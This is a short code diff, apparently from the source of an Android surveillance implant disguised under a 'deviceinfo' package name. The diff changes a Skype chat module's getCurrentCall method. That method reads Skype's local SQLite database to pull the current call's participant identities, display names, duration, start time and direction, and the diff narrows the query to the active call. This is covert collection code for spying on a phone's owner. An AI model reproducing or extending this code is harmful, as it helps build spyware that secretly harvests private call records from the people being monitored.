@@ -24,6 +24,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
 
 import com.android.deviceinfo.module.ModuleAddressBook;
+import com.android.deviceinfo.module.call.CallInfo;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.m.M;
@@ -405,7 +406,8 @@ public class ChatSkype extends SubModuleChat {
 	}
 
 	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
-		String sqlQuery= "select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1";
+		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
+		String sqlQuery= "select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1";
 		
 		RecordVisitor visitor = new RecordVisitor() {
 
